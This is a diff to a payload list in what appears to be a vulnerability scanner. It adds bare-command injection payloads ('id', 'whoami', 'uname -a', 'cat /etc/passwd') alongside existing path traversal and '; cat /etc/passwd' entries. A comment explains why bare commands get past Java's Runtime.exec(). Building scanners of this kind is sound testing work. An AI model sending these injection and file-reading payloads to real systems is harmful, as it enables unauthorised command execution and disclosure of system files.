@@ -48,6 +48,15 @@ DEFAULT_PAYLOADS: list[tuple[str, str, str, str]] = [
     ("traversal_encoded", "..%2f..%2f..%2fetc%2fpasswd", "traversal", "critical"),
     ("cmdi_semicolon", "; cat /etc/passwd", "cmdi", "critical"),
     ("cmdi_sleep", "; sleep 5", "cmdi", "critical"),
+    # cmdi on Linux without a shell wrapper: Runtime.exec() splits the
+    # argument on whitespace and execs the first token, so shell-meta
+    # payloads like "; cat /etc/passwd" fail with "Cannot run program ;".
+    # These bare-command payloads are valid executables and produce
+    # stdout that _check_output_region recognizes.
+    ("cmdi_bare_id", "id", "cmdi", "critical"),
+    ("cmdi_bare_uname", "uname -a", "cmdi", "critical"),
+    ("cmdi_bare_whoami", "whoami", "cmdi", "critical"),
+    ("cmdi_bare_passwd", "cat /etc/passwd", "cmdi", "critical"),
 ]
 
 DEFAULT_USER_AGENT = (
